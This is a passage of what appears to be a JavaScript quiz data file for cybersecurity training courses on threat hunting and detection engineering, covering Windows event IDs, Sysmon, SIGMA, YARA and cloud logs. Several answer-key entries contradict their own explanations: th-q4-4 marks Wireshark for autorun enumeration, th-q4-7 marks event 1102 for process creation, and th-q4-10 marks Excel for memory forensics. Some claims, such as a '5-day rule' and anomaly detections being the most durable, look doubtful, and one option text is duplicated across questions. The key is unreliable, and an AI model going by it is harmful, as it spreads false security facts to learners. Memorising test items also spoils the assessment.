      { id: "th-q4-4", question: "Which tool is commonly used to enumerate Windows autorun locations?", options: ["Wireshark — a network protocol analyzer used for capturing and inspecting packets live", "Nmap — a network discovery and port scanning tool for mapping active hosts and services", "Burp Suite — a web application security testing proxy for intercepting HTTP/HTTPS traffic", "Sysinternals Autoruns — comprehensively lists all auto-starting Windows persistence locations"], correctAnswer: 0, explanation: "Sysinternals Autoruns comprehensively lists all auto-starting locations in Windows for persistence analysis." },
      { id: "th-q4-5", question: "What does an unsigned binary running from a temp directory suggest?", options: ["Normal background software behavior from a trusted application vendor update process", "Potential malware — legitimate software is typically signed and installed in standard locations", "A routine operating system maintenance task writing temporary processing files to disk", "An expected scheduled backup agent operation copying data to a staging directory"], correctAnswer: 1, explanation: "Unsigned binaries in temp directories are a strong indicator of malware — legitimate software is typically signed and installed in standard locations." },
      { id: "th-q4-6", question: "What is 'stack ranking' in endpoint hunting?", options: ["Ranking individual analysts on a performance leaderboard based on alert closure metrics", "Sorting and prioritizing security patches based on their CVSS score and exploitability rating", "Counting frequency of endpoint artifacts to surface rare or anomalous values for investigation", "Stacking and reassembling captured network packets to reconstruct full session payloads"], correctAnswer: 2, explanation: "Stack ranking counts how often specific values appear — rare values (process names, paths, hashes) are more likely malicious." },
      { id: "th-q4-7", question: "Which Windows event ID logs process creation?", options: ["4624 — logs successful authentication and account logon events to the Windows Security log", "4720 — logs new user account creation events when performed by local or domain administrators", "4688 — logs process creation with process name, PID, parent PID, and command-line arguments", "1102 — logs Security audit log clearing events performed by administrator account sessions"], correctAnswer: 3, explanation: "Event ID 4688 logs process creation with details like process name, PID, and parent PID when auditing is enabled." },
      { id: "th-q4-8", question: "What is a suspicious indicator in scheduled task hunting?", options: ["Scheduled tasks created and signed by official Microsoft Group Policy configuration management", "Tasks that run standard Windows Update binaries from the System32 directory at midnight", "Tasks published by official Microsoft hardware driver update and distribution infrastructure", "Tasks running binaries from user-writable directories with encoded PowerShell command lines"], correctAnswer: 1, explanation: "Scheduled tasks executing from user-writable paths with encoded PowerShell commands are strong persistence indicators." },
      { id: "th-q4-9", question: "What is 'memory forensics' useful for in hunting?", options: ["Physically increasing system RAM capacity by installing additional memory modules in slots", "Detecting fileless malware, injected code, and hidden processes invisible to disk analysis", "Upgrading server hardware specifications to support additional virtual machine workloads", "Freeing disk space by clearing temporary files and unused application data caches"], correctAnswer: 1, explanation: "Memory forensics captures running processes, injected code, network connections, and artifacts invisible to disk-based analysis." },
      { id: "th-q4-10", question: "Which tool is widely used for memory forensics?", options: ["Microsoft Excel — for parsing and analyzing structured CSV data exports from endpoint logs", "Volatility — the industry-standard open-source memory forensics framework for investigation", "Notepad — for manually reviewing plain-text memory dump outputs and raw log files", "Microsoft Paint — for creating visual process tree diagrams from memory analysis outputs"], correctAnswer: 0, explanation: "Volatility is the industry-standard open-source framework for memory forensics, supporting process, network, and malware analysis." }
    ]
  },
  {
    quizId: "th-q5",
    courseId: "threat-hunting",
    title: "Network & Cloud Hunting",
    description: "Assess your ability to hunt threats across network traffic and cloud environments.",
    passingScore: 70,
    timeLimit: 15,
    questions: [
      { id: "th-q5-1", question: "What is DNS beaconing?", options: ["Standard recursive DNS resolution queries performed by local client browsers to load website assets", "Malware periodically querying an external command and control server domain at regular time intervals", "Routine DNS server replication and zone transfer operations between primary and secondary name servers", "Automatic dynamic updates of client hostname records within local Active Directory DNS databases"], correctAnswer: 1, explanation: "DNS beaconing is malware communicating with C2 via periodic DNS queries, often at suspiciously regular intervals." },
      { id: "th-q5-2", question: "Which network artifact helps detect DNS tunneling?", options: ["Extremely short DNS query names targeting local domain controllers or internal intranet resources", "Standard DNS pointer record lookup requests attempting to resolve IP addresses back to hostnames", "Routine lease renewal requests sent to local DHCP servers to extend IP address configuration times", "Unusually long and complex DNS query names exhibiting high character entropy and random subdomains"], correctAnswer: 3, explanation: "DNS tunneling encodes data in query names, resulting in unusually long, high-entropy subdomain strings." },
      { id: "th-q5-3", question: "What is a 'long tail' analysis in network hunting?", options: ["Analyzing rare and infrequent network connections that deviate significantly from baseline traffic", "Measuring physical network cable runs and identifying optimal paths for routing copper connection lines", "Calculating packet transfer latencies and identifying bottlenecks in core routing infrastructure", "Monitoring aggregate bandwidth utilization to identify departments consuming excessive data volumes"], correctAnswer: 0, explanation: "Long tail analysis focuses on rare connections — the uncommon destinations or patterns that are statistically anomalous and potentially malicious." },
      { id: "th-q5-4", question: "Which protocol is commonly abused for data exfiltration due to being rarely inspected?", options: ["High-speed User Datagram Protocol (UDP) media streaming sessions that are typically blocked at boundaries", "Internal Remote Desktop Protocol (RDP) sessions that are actively monitored by network security tools", "Common protocols like DNS, HTTP, and SMTP which are typically permitted through firewalls with minimal audit", "Encrypted SSH tunnel sessions established exclusively between validated internal administrative servers"], correctAnswer: 2, explanation: "DNS, HTTP, HTTPS, and SMTP are all commonly abused — DNS is particularly stealthy since it's rarely blocked or deeply inspected." },
      { id: "th-q5-5", question: "In cloud hunting, what is the most critical log source?", options: ["Application-specific server logs that track user session logins and internal application database queries", "Cloud provider audit activity logs such as AWS CloudTrail or Azure Activity Log tracking API operations", "Workstation operating system event logs tracking local process executions and file write operations", "Local print spooler logs recording document print jobs sent from user workstations to local printers"], correctAnswer: 1, explanation: "Cloud audit logs (AWS CloudTrail, Azure Activity Log, GCP Audit Logs) record all API calls and are essential for cloud hunting." },
      { id: "th-q5-6", question: "What does an unusually high volume of outbound traffic to a single IP suggest?", options: ["Potential data exfiltration activity where sensitive corporate assets are transferred to external systems", "Routine data backup processes transferring scheduled file archives to local storage vaults on segment", "Automatic background operating system update tasks downloading large patches from verified servers", "Standard corporate email delivery processes queueing outbound messages to internal SMTP gateways"], correctAnswer: 0, explanation: "Large outbound transfers to a single IP, especially outside business hours, are a strong exfiltration indicator." },
      { id: "th-q5-7", question: "What is 'east-west traffic' in network hunting?", options: ["Global internet traffic traversing continental boundaries through undersea fiber optic communication links", "Inbound traffic originating from public web clients accessing external-facing web applications in DMZs", "Internal network communications representing lateral movement of hosts and traffic between internal systems", "Outbound internet browsing traffic originating from internal user workstations accessing web servers"], correctAnswer: 2, explanation: "East-west traffic is internal lateral communication — hunting here reveals lateral movement after initial compromise." },
      { id: "th-q5-8", question: "Which cloud-specific threat involves misconfigured storage buckets?", options: ["Distributed Denial of Service (DDoS) attacks targeting public-facing load balancers with volume traffic", "Coordinated phishing campaigns targeting cloud administration credentials via deceptive login portals", "Automated brute force login attempts targeting exposed cloud management consoles and API endpoints", "Unintentional data exposure through publicly accessible cloud storage buckets like AWS S3 or Azure Blobs"], correctAnswer: 3, explanation: "Misconfigured cloud storage (open S3 buckets, Azure Blobs) is a major cloud threat causing data exposure." },
      { id: "th-q5-9", question: "What is 'impossible travel' detection in cloud environments?", options: ["Detecting active VPN configurations and anonymizing proxy servers used to mask user source IP addresses", "Flagging user authentication events occurring from distant geographical locations in impossible timelines", "Analyzing travel reservation booking patterns of executive staff members to prevent physical targeting", "Monitoring and auditing internal employee travel expense reimbursement claims for suspicious activity"], correctAnswer: 1, explanation: "Impossible travel flags when a user logs in from two distant locations faster than physically possible, indicating credential compromise." },
      { id: "th-q5-10", question: "What network hunting technique examines TLS certificate anomalies?", options: ["Analyzing individual network packet sizes and payload lengths to identify hidden command signatures", "Checking hardware MAC address tables on local network switches to detect unauthorized physical devices", "Analyzing TLS certificate transparency logs and detecting self-signed certs used by C2 infrastructure", "Monitoring local VLAN configuration updates to identify unauthorized port assignments and access routes"], correctAnswer: 2, explanation: "Analyzing TLS certificates for self-signed certs, unusual issuers, or short validity periods helps detect C2 infrastructure." }
    ]
  },
  {
    quizId: "th-q6",
    courseId: "threat-hunting",
    title: "Hunt Operations & Reporting",
    description: "Test your knowledge of hunt planning, automation, metrics, and reporting best practices.",
    passingScore: 70,
    timeLimit: 15,
    questions: [
      { id: "th-q6-1", question: "What should a hunt plan document include?", options: ["Only the initial starting hypothesis statement and the name of the assigned analyst", "A comprehensive checklist of all organizational assets and physical server locations", "Hypothesis, data sources, analysis techniques, tools, expected artifacts, and success criteria", "A detailed list of known indicator of compromise signatures gathered from external blogs"], correctAnswer: 2, explanation: "A complete hunt plan includes hypothesis, required data sources, analysis techniques, tools, expected artifacts, and success criteria." },
      { id: "th-q6-2", question: "What is the main benefit of converting hunt findings into automated detections?", options: ["Scales the hunt outcome so the same threat is automatically detected going forward in the future", "Reduces overall security team headcount and lowers operational licensing costs for SIEM tools", "Completely eliminates the need for any manual hunting or active hypothesis development by analysts", "Saves cloud database storage capacity by compressing long-term historical endpoint event logs"], correctAnswer: 0, explanation: "Converting hunts into detections means the threat is automatically caught going forward, multiplying the value of each hunt." },
      { id: "th-q6-3", question: "Which tool/platform is commonly used for hunt automation and notebooks?", options: ["Microsoft Paint — commonly used for manual creation of process trees and network topology diagrams", "Standard Windows Calculator — used for performing quick event frequency and log size calculations", "Default Notepad editor — used for copy-pasting raw logs and organizing unstructured text snippets", "Jupyter Notebooks with MSTICPy — provides reproducible, shareable data analysis hunt workflows"], correctAnswer: 3, explanation: "Jupyter Notebooks with MSTICPy provide reproducible, shareable hunt workflows with built-in security analysis capabilities." },
      { id: "th-q6-4", question: "What is the 'detection gap' metric?", options: ["The average processing time delay between the occurrence of a security event and its alert generation", "The difference between existing real-world threats and what the organization can actively detect", "The network transmission latency between remote branch offices and central cloud security log pools", "The gap in analyst shift schedules during weekend handovers that leaves the console unmonitored"], correctAnswer: 1, explanation: "Detection gap measures the difference between threats that exist and those the org can detect — hunting directly reduces this gap." },
      { id: "th-q6-5", question: "What should a hunt report's executive summary contain?", options: ["A collection of raw, unparsed log outputs and complex search queries used during the hunt process", "Only specific threat indicator files like IP address lists and malware file hash values to block", "High-level findings, business impact, threat risk assessment, and specific recommended actions", "Detailed technical configuration details of the endpoint agent software used to collect system data"], correctAnswer: 2, explanation: "Executive summaries provide leadership with findings, business impact, risk context, and clear recommended actions." },
      { id: "th-q6-6", question: "How should hunt metrics demonstrate program value?", options: ["Track hunts completed, unique findings discovered, detections created, and coverage improvements", "Count only the total hours worked and resources consumed by security analysts during the quarter", "Report only unsuccessful hunts where no active threat actors or configuration errors were found", "Count the total number of outbound status update emails sent to executive stakeholders each week"], correctAnswer: 0, explanation: "Effective metrics include hunts completed, unique findings, new detections created, MITRE coverage improvements, and mean time to detect." },
      { id: "th-q6-7", question: "What is the purpose of a 'hunt backlog'?", options: ["Storing historic, cold-tier log files that are no longer needed for active incident investigations", "Tracking employee scheduled time-off requests to ensure adequate analyst coverage at all times", "Archiving completed PDF hunt reports to meet compliance audit and document retention standards", "Maintaining a prioritized queue of hypotheses and hunt ideas for future scheduled execution cycles"], correctAnswer: 3, explanation: "A hunt backlog is a prioritized list of hypotheses and ideas, ensuring continuous hunting coverage aligned with threat landscape." },
      { id: "th-q6-8", question: "When should IOCs discovered during a hunt be shared?", options: ["Keep them strictly confidential within the hunt team to prevent disclosing internal detection gaps", "Share immediately with internal SOC and incident response teams, plus relevant intel communities", "Delay sharing for at least six months to allow time for the security vendor to analyze patterns", "Share exclusively with local system administrators without notifying the central security operations"], correctAnswer: 1, explanation: "IOCs should be shared immediately with SOC/IR for blocking and with threat intel sharing communities (ISACs) for collective defense." },
      { id: "th-q6-9", question: "What does 'MITRE ATT&CK coverage mapping' help hunters understand?", options: ["Mapping the physical corporate network topology to locate all connected routers and user devices", "Evaluating individual analyst technical skill levels against industry standard security certifications", "Visualizing which adversary techniques can be detected, highlighting gaps to prioritize future hunts", "Calculating annual budget allocations for threat detection software licenses and hardware appliances"], correctAnswer: 2, explanation: "ATT&CK coverage mapping visualizes detection capabilities against known techniques, highlighting gaps to prioritize hunts." },
      { id: "th-q6-10", question: "What is the relationship between threat hunting and detection engineering?", options: ["Hunt findings feed detection engineering; detection gaps inform hunt priorities in a continuous cycle", "They are completely unrelated operational functions with separate goals and no shared communication", "Threat hunting completely replaces detection engineering, rendering automated alerts obsolete and unused", "Detection engineering completely replaces threat hunting, automating all hypothesis testing processes"], correctAnswer: 0, explanation: "Hunting and detection engineering form a virtuous cycle: hunts discover threats → detections are built → gaps inform new hunts." }
    ]
  },
  // ===================== Detection Engineering Basics =====================
  {
    quizId: "de-q1",
    courseId: "detection-engineering",
    title: "Detection Fundamentals",
    description: "Test your understanding of detection philosophy, coverage models, and alert quality.",
    passingScore: 70,
    timeLimit: 15,
    questions: [
      { id: "de-q1-1", question: "What is the most durable type of detection on the detection spectrum?", options: ["Hash-based detections matching specific static MD5 or SHA256 string signatures of known files", "Signature-based rules checking for specific byte patterns within static program executables", "Behavioral-based indicators that track common system changes like registry key additions", "Anomaly-based detections utilizing statistical baselines of normal user activity patterns"], correctAnswer: 3, explanation: "Anomaly-based detections using statistical baselines are the most durable, lasting years compared to hash-based detections that last hours." },
      { id: "de-q1-2", question: "What is the 'assume breach' principle in detection engineering?", options: ["Assume adversaries have already penetrated defenses and validate controls through proactive detection", "Assume all enterprise software applications contain critical vulnerabilities that cannot be patched", "Assume breaches are completely unavoidable and thus stop investing in traditional perimeter defense", "Assume every single low-severity console alert represents a major network security breach event"], correctAnswer: 0, explanation: "Assume breach means building detections that validate whether controls are working, not just blocking at the perimeter." },
      { id: "de-q1-3", question: "What is a good target false positive rate for a high-fidelity detection?", options: ["Below fifty percent to allow analysts ample time for manual sorting and review of event logs", "Below thirty percent to keep general SOC dashboard statistics looking positive for leadership", "Below five percent to prevent alert fatigue and ensure analysts trust the actionability of alerts", "Below fifteen percent to maintain a balanced ratio between true security alerts and false alarms"], correctAnswer: 2, explanation: "High-fidelity detections should have a FP rate below 5% — analysts must trust alerts to be actionable." },
      { id: "de-q1-4", question: "What does 'detection as a product' mean?", options: ["Selling custom detection rules commercially to external security operations centers and firms", "Applying software engineering practices like version control, testing, and lifecycle management", "Using exclusively commercial, pre-packaged security vendor rules that require zero custom tuning", "Focusing detection development efforts solely on identifying hardware and physical asset failures"], correctAnswer: 1, explanation: "Detection as a product applies software engineering practices: requirements, testing, version control, and lifecycle management." },
      { id: "de-q1-5", question: "Why are behavior-based detections preferred over IOC-based detections?", options: ["Behaviors are more durable, as attackers easily change static IOCs but changing TTPs is very costly", "Behavioral rules are significantly easier to design and require far fewer resources than simple IOCs", "They are guaranteed to produce zero false positive alerts during complex software update cycles", "They require significantly less log storage and processing power to evaluate in SIEM consoles"], correctAnswer: 0, explanation: "Behaviors (TTPs) sit at the top of the Pyramid of Pain — changing tradecraft is far more costly for adversaries than rotating IOCs." },
      { id: "de-q1-6", question: "What is the primary cost of false positives in a SOC?", options: ["Excessive database storage and license cost consumption caused by archiving large volumes of logs", "Wasted network bandwidth from transferring unnecessary event telemetry from endpoints to SIEM", "Increased software licensing fees paid to security vendors based on alert volume metrics on system", "Analyst fatigue and alert blindness, directly leading to critical real security threats being missed"], correctAnswer: 3, explanation: "False positives cause analyst fatigue and alert blindness, directly leading to missed real threats." },
      { id: "de-q1-7", question: "What framework is most commonly used to map detection coverage?", options: ["NIST Cybersecurity Framework (CSF) for establishing high-level organizational security baselines", "ISO 27001 standard documentation to meet compliance requirements for external security auditors", "MITRE ATT&CK matrix to map adversary techniques and systematically identify detection coverage gaps", "CIS Controls list to audit basic system security configurations and user account permissions"], correctAnswer: 2, explanation: "MITRE ATT&CK maps adversary techniques and is the standard framework for measuring detection coverage." },
      { id: "de-q1-8", question: "What should you verify BEFORE writing any detection rule?", options: ["Obtain formal budget approval for potential SIEM license expansion from corporate finance leaders", "Verify that the necessary log source is actively enabled, ingested, and normalized in the SIEM", "Ensure that similar detection rules have not been written by external security community forums", "Obtain written approval from the director of security operations to deploy a new monitoring rule"], correctAnswer: 1, explanation: "No data = no detection. Always verify the log source is enabled, ingested into SIEM, and normalized before writing rules." },
      { id: "de-q1-9", question: "What is the '5-day rule' for noisy detections?", options: ["Disable a rule immediately if it generates more than 5 false positives per day for 5 straight days", "Review and rewrite every active production detection rule systematically every five working days", "Deploy newly written detection rules in alert-only staging environments for precisely five days", "Require every detection analyst to write and deploy a minimum of five new detection rules per day"], correctAnswer: 0, explanation: "The 5-day rule prevents persistent noise: disable immediately and schedule a rewrite rather than letting noise accumulate." },
      { id: "de-q1-10", question: "What is the detection engineering lifecycle order?", options: ["Deploy rule to production, run verification tests, design query logic, gather logging requirements", "Write search queries, deploy rules, and archive documentation without performing validation tests", "Identify requirements, design logic, develop rules, perform testing, deploy, operate, and retire", "Test system controls, build automated pipelines, ship rules to production, and monitor console alerts"], correctAnswer: 2, explanation: "The full lifecycle is: Requirements → Design → Development → Testing → Deployment → Operations → Retirement." }
    ]
  },
  {
    quizId: "de-q2",
    courseId: "detection-engineering",
    title: "SIGMA Rules",
    description: "Assess your knowledge of SIGMA syntax, modifiers, and rule conversion.",
    passingScore: 70,
    timeLimit: 15,
    questions: [
      { id: "de-q2-1", question: "What format are SIGMA rules written in?", options: ["Extensible Markup Language (XML) format designed for structured system configurations", "YAML Ain't Markup Language (YAML) format designed for human readability and code tracking", "JavaScript Object Notation (JSON) format optimized for high-speed API data exchanges", "Tom's Obvious Minimal Language (TOML) format optimized for simple application settings"], correctAnswer: 1, explanation: "SIGMA rules use YAML format, making them human-readable and version-control friendly." },
      { id: "de-q2-2", question: "What is the purpose of the 'logsource' field in SIGMA?", options: ["Define the specific output format and destination SIEM repository for generated rule alerts", "Configure the severity levels and prioritization metrics applied to triggered analyst alerts", "Specify the developer's name, rule release version, and licensing conditions of the rule", "Define the target dataset category and operating system product that generated the event logs"], correctAnswer: 3, explanation: "The logsource field abstracts the data source using category (process_creation) and product (windows), enabling vendor-neutral rules." },
      { id: "de-q2-3", question: "What does the SIGMA modifier 'endswith' do?", options: ["Applies a wildcard matching modifier to evaluate if fields terminate with a specific string", "Marks the end of the SIGMA rule definition block and prevents any further rule processing", "Initiates a count modifier tracking the total number of line endings in parsed telemetry", "Terminates the active connection between the endpoint collection agent and target SIEM pool"], correctAnswer: 0, explanation: "The endswith modifier performs a suffix match — e.g., Image|endswith: '\\powershell.exe' matches any path ending with that string." },
      { id: "de-q2-4", question: "How do you exclude false positives in a SIGMA rule?", options: ["Delete the entire detection rule immediately from the production git repository to stop noise", "Ignore the generated alerts in the SOC console and wait for automated cleanup script cycles", "Define an exclusion filter selection block and apply a 'not' conditional statement in rules", "Send an automated email notification to the SOC manager requesting manual system updates"], correctAnswer: 2, explanation: "Define a filter selection containing FP patterns, then use 'condition: selection and not filter' to exclude them." },
      { id: "de-q2-5", question: "What tool converts SIGMA rules to SIEM-specific queries?", options: ["Wireshark packet analyzer application used for capturing and inspecting raw network flows", "The pySigma parser engine and sigma-cli utility converting rules to target SIEM queries", "Nmap port scanner used for mapping active hosts, open ports, and running services on network", "Volatility memory analysis framework used for extracting forensic artifacts from RAM dumps"], correctAnswer: 1, explanation: "pySigma (sigma-cli) converts SIGMA rules to Splunk SPL, Elastic KQL, Sentinel KQL, and other SIEM query languages." },
      { id: "de-q2-6", question: "What does 'condition: 1 of selection*' mean?", options: ["Triggers the rule if any selection block matching the wildcard pattern is successfully met", "Evaluates only the first defined selection block in the rule and ignores remaining criteria", "Requires exactly one matching event occurrence across all defined selection criteria blocks", "Instructs the converter engine to select a single random query field for SIEM translation"], correctAnswer: 0, explanation: "'1 of selection*' means any selection whose name starts with 'selection' can trigger the rule — useful for multiple variants." },
      { id: "de-q2-7", question: "What is a SIGMA processing pipeline?", options: ["An automated database backup process that archives cold historical log events to cloud pools", "A standard network communication protocol designed for transferring logs between remote segments", "A transformation configuration mapping generic SIGMA field names to target SIEM schema fields", "A software CI/CD pipeline executing linting and unit validation tests for detection scripts"], correctAnswer: 2, explanation: "Processing pipelines map SIGMA's generic field names to SIEM-specific fields (e.g., Image → process.executable in ECS)." },
      { id: "de-q2-8", question: "How does SIGMA handle aggregation?", options: ["SIGMA is a static query format and does not support any aggregation functions or operators", "Delegates all mathematical aggregation processes to external command-line scripting tools", "Restricts aggregation functions exclusively to the paid enterprise versions of the converter", "Supports count() and sum() operators combined with timeframe parameters inside conditions"], correctAnswer: 3, explanation: "SIGMA supports aggregation functions like count() with timeframes — e.g., 'count(user) by src_ip > 10' in a 5m window." },
      { id: "de-q2-9", question: "What does the 'tags' field in SIGMA typically contain?", options: ["Hypertext Markup Language (HTML) tags used for structuring browser display formats of alerts", "Standardized MITRE ATT&CK tactic and technique IDs utilized for mapping detection coverage", "Operating system file tags used by local filesystems to categorize user-accessible documents", "Network boundary firewall tags indicating which security zones allow outbound traffic flows"], correctAnswer: 1, explanation: "Tags map to ATT&CK techniques (e.g., attack.t1059.001) and tactics (e.g., attack.execution) for coverage mapping." },
      { id: "de-q2-10", question: "What is SigmaHQ?", options: ["A commercial cyber security corporation specializing in custom automated detection products", "A vendor-specific SIEM appliance designed for hosting large-scale corporate event databases", "The official open-source community repository hosting thousands of curated SIGMA rules", "An international certification body defining standards for cyber defense engineering programs"], correctAnswer: 2, explanation: "SigmaHQ is the official open-source repository containing thousands of community-maintained SIGMA detection rules." }
    ]
  },
  {
    quizId: "de-q3",
    courseId: "detection-engineering",
    title: "YARA Signatures",
    description: "Quiz on YARA rule structure, pattern matching, and conditions.",
    passingScore: 70,
    timeLimit: 15,
    questions: [
      { id: "de-q3-1", question: "What are the three main sections of a YARA rule?", options: ["Header definition block, execution body sequence, and final rule footer lines", "Metadata section (meta), search pattern strings (strings), and match logic (condition)", "Input log mappings, data normalization processor, and output alert channel rules", "Descriptive rule name, search query patterns, and automated security alert actions"], correctAnswer: 1, explanation: "YARA rules consist of meta (metadata), strings (patterns to match), and condition (logic determining a match)." },
      { id: "de-q3-2", question: "What does the YARA modifier 'wide' do?", options: ["Broadens the matching criteria scope so the YARA rule applies to a wider set of files", "Expands the scanning search width limits to identify obfuscated signature matches", "Extends the logical evaluation condition to allow flexible boolean operator combinations", "Instructs the scanner engine to search for UTF-16 double-byte encoded character strings"], correctAnswer: 3, explanation: "The 'wide' modifier matches UTF-16 encoded strings, which is how Windows often stores text internally." },
      { id: "de-q3-3", question: "What does 'uint16(0) == 0x5A4D' check in a YARA condition?", options: ["Validates if the target binary is a Windows PE executable checking for the MZ header", "Measures the overall file size footprint to filter out large system archive containers", "Counts the frequency of a specific ASCII string pattern appearing inside the file body", "Checks if the binary initiates outbound network sessions on predefined admin ports"], correctAnswer: 0, explanation: "0x5A4D is the MZ magic number at offset 0, indicating a Windows PE executable file." },
      { id: "de-q3-4", question: "What does the YARA 'xor' modifier do?", options: ["Encrypts the entire YARA rule logic using a secure, custom XOR mathematical operation", "Applies a logical exclusive OR operation across all defined condition evaluation steps", "Instructs the scanner to automatically check for XOR-rotated variations of a string", "Disables the target search string entirely during scans if a known debugger is running"], correctAnswer: 2, explanation: "The xor modifier generates all (or specified range) XOR-rotated variants, detecting simple obfuscation automatically." },
      { id: "de-q3-5", question: "What does high entropy (>7.5) in a PE section indicate?", options: ["Normal text content, consisting primarily of standard ASCII character strings", "Highly compressed, packed, or encrypted content, which is common in malware binaries", "An empty or uninitialized section structure writing zero-byte sequences to system disks", "Standard compiler debug information and symbols embedded inside legitimate software"], correctAnswer: 1, explanation: "Entropy above 7.5 strongly indicates packed, encrypted, or compressed content — common in malware." },
      { id: "de-q3-6", question: "Which YARA module is used to analyze PE file structure?", options: ["The specialized PE module, providing access to headers, sections, imports, and exports", "The default math module, used for calculating section entropy and statistical offsets", "The ELF module, designed for parsing Executable and Linkable Format binaries on Linux", "The cryptographic hash module, generating MD5, SHA1, and SHA256 file fingerprints"], correctAnswer: 0, explanation: "The pe module provides access to PE headers, sections, imports, exports, and signature information." },
      { id: "de-q3-7", question: "What is the purpose of hex wildcards (??) in YARA strings?", options: ["Act as rule comment markers instructing the compiler to skip evaluation of specific strings", "Indicate compilation syntax errors that should be resolved before deploying the signature", "Represent a wildcard byte placeholder that matches any value at that specific position", "Define individual section boundary boundaries inside the parsed program executable format"], correctAnswer: 2, explanation: "Hex wildcards (??) match any byte, handling variable opcodes or data within otherwise fixed byte patterns." },
      { id: "de-q3-8", question: "How should YARA rules be optimized for production scanning?", options: ["Rely exclusively on complex regular expression strings to capture variable threat formats", "Scan every single file on system disks regardless of file sizes or directory locations", "Disable all external parser modules and logical string operators to speed up scan times", "Apply string offset anchors, define strict filesize limits, and avoid heavy regex rules"], correctAnswer: 3, explanation: "Optimized rules use 'at 0' anchors, filesize limits, and simple patterns to minimize scan time at scale." },
      { id: "de-q3-9", question: "What does '#suspicious_api > 5' check in a YARA condition?", options: ["Measures the character length of the target string variables defined in the rule", "Validates whether the specific string occurs more than five times in the target file", "Locates the exact byte offset address where the target string pattern is found in file", "Defines the priority ranking level used to sort triggered signatures in the console"], correctAnswer: 1, explanation: "The # operator counts string occurrences — #suspicious_api > 5 checks if the string appears more than 5 times." },
      { id: "de-q3-10", question: "What is the recommended naming convention for YARA rules?", options: ["Assigning random alphanumeric identifier strings to prevent exposing rule scope to threat actors", "Using simple sequential numeric names to track rules in the order they were created by analysts", "Using structured names like APT_Group_Technique_Description.yar for organized management", "Naming rules solely based on creation timestamps to meet compliance audit requirements"], correctAnswer: 2, explanation: "Descriptive naming like APT_Group_Technique_Description.yar enables quick identification and organized rule management." }
    ]
  },
  {
    quizId: "de-q4",
    courseId: "detection-engineering",
    title: "Log Source Mastery",
    description: "Test your knowledge of Windows, Linux, network, and cloud log sources.",
    passingScore: 70,
    timeLimit: 15,
    questions: [
      { id: "de-q4-1", question: "Which Windows Event ID indicates a successful logon?", options: ["Event ID 4625 — indicating a failed user authentication attempt on the local machine", "Event ID 4624 — indicating a successful logon session with type and source details", "Event ID 4688 — indicating process creation events with full command-line arguments", "Event ID 4698 — indicating a new scheduled task created under administrator rights"], correctAnswer: 1, explanation: "Event ID 4624 logs successful authentication events with logon type, source, and account details." },
      { id: "de-q4-2", question: "Why is Sysmon essential for Windows detection?", options: ["It is pre-installed on all Windows installations and active by default out of the box", "It fully replaces the native Windows event log service and local security databases", "It is configured exclusively to record system error events and kernel panic warnings", "It logs process command lines, file hashes, registry edits, and network connections"], correctAnswer: 3, explanation: "Sysmon captures process command lines, hashes, network connections, and parent-child relationships that native auditing misses." },
      { id: "de-q4-3", question: "Which Sysmon event ID detects DLL side-loading?", options: ["Sysmon Event ID 7 (Image Loaded) — logging DLL loads with hash and signature details", "Sysmon Event ID 1 (Process Creation) — logging new process executions on the endpoint", "Sysmon Event ID 3 (Network Connection) — logging outbound TCP/UDP network connections", "Sysmon Event ID 10 (ProcessAccess) — logging cross-process handle access operations"], correctAnswer: 0, explanation: "Sysmon Event ID 7 logs DLL/image loads with hash and signature information, enabling DLL side-loading detection." },
      { id: "de-q4-4", question: "What Zeek log file captures DNS queries?", options: ["conn.log — containing basic IP connection metadata, protocol ports, and session lengths", "http.log — recording web requests, response codes, user agents, and requested hostnames", "dns.log — capturing all resolved domain names, query types, and corresponding responses", "ssl.log — logging certificate details, TLS versions, and established session handshakes"], correctAnswer: 2, explanation: "Zeek's dns.log captures all DNS queries and responses with full detail for DNS-based threat detection." },
      { id: "de-q4-5", question: "Which cloud log source records all AWS API calls?", options: ["VPC Flow Logs — documenting all internal and external network packet traffic directions", "AWS CloudTrail — logging every API call and console operation in the cloud account", "AWS CloudWatch — monitoring real-time server resource utilization and event metrics", "S3 Server Access Logs — tracking access requests made to individual storage buckets"], correctAnswer: 1, explanation: "AWS CloudTrail records every API call made in the AWS account, essential for cloud security detection." },
      { id: "de-q4-6", question: "What is the purpose of log normalization?", options: ["Translating different raw log structures and fields into a single standardized schema", "Automatically deleting duplicate log entries to conserve database indexing storage space", "Compressing historical log datasets to accelerate query execution times in consoles", "Applying encryption algorithms to event records to prevent unauthorized access on disk"], correctAnswer: 0, explanation: "Normalization maps different field names (SourceIP, src_ip, srcaddr) to a common schema (source.ip) for cross-source correlation." },
      { id: "de-q4-7", question: "What does ECS stand for in the context of log normalization?", options: ["Enterprise Control System — a compliance security benchmark for internal networks", "Event Classification Standard — a vendor benchmark defining standard alert severity", "Elastic Common Schema — a normalized naming system for consistent field mappings", "Endpoint Collection Service — a proprietary service used to harvest workstation logs"], correctAnswer: 2, explanation: "ECS (Elastic Common Schema) provides standardized field names for consistent log normalization across sources." },
      { id: "de-q4-8", question: "Which Linux log file records SSH authentication events?", options: ["/var/log/messages — logging general system activity and non-critical daemon events", "/var/log/kern.log — capturing low-level Linux kernel processing and driver events", "/var/log/boot.log — recording hardware startup initialization and service load status", "/var/log/auth.log — logging user authentication events, session starts, and SSH logs"], correctAnswer: 3, explanation: "/var/log/auth.log (Debian/Ubuntu) or /var/log/secure (RHEL) records all authentication events including SSH." },
      { id: "de-q4-9", question: "What type of cloud detection identifies logins from geographically impossible locations?", options: ["Distributed Denial of Service (DDoS) detection tracking high-volume packet traffic", "Impossible travel detection flagging logins from distant locations in short intervals", "Brute force attack detection identifying repetitive authentication failure signatures", "Data Loss Prevention (DLP) monitoring to block unauthorized uploads to cloud sites"], correctAnswer: 1, explanation: "Impossible travel flags logins from distant locations in impossibly short timeframes, indicating credential compromise." },
      { id: "de-q4-10", question: "What does log enrichment add to raw events?", options: ["Injecting more raw logs to increase total event volume indexed by target databases", "Compressing telemetry events at source nodes before they traverse network channels", "Adding context like IP geolocation, user roles, threat intelligence, and asset value", "Applying encryption algorithms to event records to prevent unauthorized access on disk"], correctAnswer: 2, explanation: "Enrichment adds reputation, geolocation, asset criticality, and user context — transforming raw logs into actionable intelligence." }
    ]
  },
  {
    quizId: "de-q5",
    courseId: "detection-engineering",
    title: "Detection-as-Code",
    description: "Assess your understanding of version control, CI/CD, and testing for detections.",
    passingScore: 70,
    timeLimit: 15,
    questions: [
